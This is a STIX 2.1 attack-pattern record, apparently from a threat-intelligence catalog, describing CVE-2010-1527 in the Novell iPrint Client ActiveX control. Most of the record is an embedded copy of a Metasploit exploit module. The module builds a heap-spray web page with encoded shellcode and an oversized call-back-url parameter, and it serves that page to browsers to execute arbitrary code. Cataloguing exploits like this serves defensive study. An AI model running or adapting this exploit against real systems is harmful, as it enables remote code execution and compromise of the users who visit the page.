{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ef63f9a4-dcad-42d2-a902-23be0d35bcf8",
    "created": "2024-08-14T16:43:08.259614Z",
    "modified": "2024-08-14T16:43:08.259618Z",
    "name": "Novell iPrint Client ActiveX Control call-back-url Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow in Novell iPrint Client 5.42. When sending an overly long string to the 'call-back-url' parameter in an op-client-interface-version action of ienipp.ocx an attacker may be able to execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/novelliprint_callbackurl.rb",
            "external_id": "novelliprint_callbackurl.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-1527"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n##\n# novelliprint_callbackurl.rb\n#\n# Novell iPrint Client ActiveX Control call-back-url Buffer Overflow exploit for the Metasploit Framework\n#\n# Exploit successfully tested on the following platforms:\n#  - Novell iPrint Client 5.40 on Internet Explorer 7, Windows XP SP3\n#  - Novell iPrint Client 5.42 on Internet Explorer 7, Windows XP SP3\n#  - Novell iPrint Client 5.42 on Internet Explorer 7, Windows Vista SP2\n#\n# ienipp.ocx version tested:\n# File Version: 5.4.0.0 and 5.4.2.0\n# ClassID: 36723F97-7AA0-11D4-8919-FF2D71D0D32C\n# RegKey Safe for Script: True\n# RegKey Safe for Init: True\n# KillBitSet: False\n#\n# References:\n#  - CVE-2010-1527\n#  - OSVDB 67411\n#  - http://web.archive.org/web/20100824204359/http://secunia.com:80/secunia_research/2010-104 - Original advisory by Carsten Eiram, Secunia Research\n#  - https://www.exploit-db.com/exploits/15042/ - MOAUB #19 exploit\n#  - https://www.exploit-db.com/moaub-19-novell-iprint-client-browser-plugin-call-back-url-stack-overflow/ - MOAUB #14 binary analysis\n#  - http://www.rec-sec.com/2010/09/21/novell-iprint-callbackurl-buffer-overflow-exploit/ - Metasploit exploit by Trancer, Recognize-Security\n#\n# Trancer\n# http://www.rec-sec.com\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Novell iPrint Client ActiveX Control call-back-url Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow in Novell iPrint Client 5.42.\n        When sending an overly long string to the 'call-back-url' parameter in an\n        op-client-interface-version action of ienipp.ocx an attacker may be able to\n        execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'Trancer <mtrancer[at]gmail.com>' ],\n      'References'     =>\n        [\n          [ 'CVE', '2010-1527' ],\n          [ 'OSVDB', '67411'],\n          [ 'URL', 'http://web.archive.org/web/20100824204359/http://secunia.com:80/secunia_research/2010-104' ],\t# Carsten Eiram, Secunia Research\n          [ 'EDB', '15042' ],\t\t# MOAUB #19\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP0-SP2 / Windows Vista / IE 6.0 SP0-SP2 / IE 7', { 'Ret' => 0x0A0A0A0A } ]\n        ],\n      'DisclosureDate' => '2010-08-20',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload.\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Encode the shellcode.\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Setup exploit buffers\n    nops \t  = Rex::Text.to_unescape([target.ret].pack('V'))\n    ret  \t  = [target.ret].pack('V')\n    ret \t  = ret * 250\n    blocksize = 0x40000\n    fillto    = 500\n    offset \t  = target['Offset']\n\n    # ActiveX parameters\n    clsid \t= \"36723F97-7AA0-11D4-8919-FF2D71D0D32C\"\n\n    # Randomize the javascript variable names\n    ienipp       = rand_text_alpha(rand(100) + 1)\n    j_shellcode  = rand_text_alpha(rand(100) + 1)\n    j_nops       = rand_text_alpha(rand(100) + 1)\n    j_ret        = rand_text_alpha(rand(100) + 1)\n    j_headersize = rand_text_alpha(rand(100) + 1)\n    j_slackspace = rand_text_alpha(rand(100) + 1)\n    j_fillblock  = rand_text_alpha(rand(100) + 1)\n    j_block      = rand_text_alpha(rand(100) + 1)\n    j_memory     = rand_text_alpha(rand(100) + 1)\n    j_counter    = rand_text_alpha(rand(30) + 2)\n    randnop      = rand_text_alpha(rand(100) + 1)\n\n    html = %Q|<html>\n<script>\nvar #{j_shellcode} = unescape('#{shellcode}');\nvar #{randnop} = \"#{nops}\";\nvar #{j_nops} = unescape(#{randnop});\nvar #{j_headersize} = 20;\nvar #{j_slackspace} = #{j_headersize} + #{j_shellcode}.length;\nwhile (#{j_nops}.length < #{j_slackspace}) #{j_nops} += #{j_nops};\nvar #{j_fillblock} = #{j_nops}.substring(0,#{j_slackspace});\nvar #{j_block} = #{j_nops}.substring(0,#{j_nops}.length - #{j_slackspace});\nwhile (#{j_block}.length + #{j_slackspace} < #{blocksize}) #{j_block} = #{j_block} + #{j_block} + #{j_fillblock};\nvar #{j_memory} = new Array();\nfor (#{j_counter} = 0; #{j_counter} < #{fillto}; #{j_counter}++) {\n  #{j_memory}[#{j_counter}] = #{j_block} + #{j_shellcode};\n}\n</script>\n<object classid='clsid:#{clsid}' id='#{ienipp}'>\n<param name='operation' value='op-client-interface-version' />\n<param name='result-type' value='url' />\n<param name='call-back-url' value='#{ret}' />\n</object>\n</html>|\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response(cli, html, { 'Content-Type' => 'text/html' })\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-08-20",
    "x_mitre_platforms": [
        "win'"
    ]
}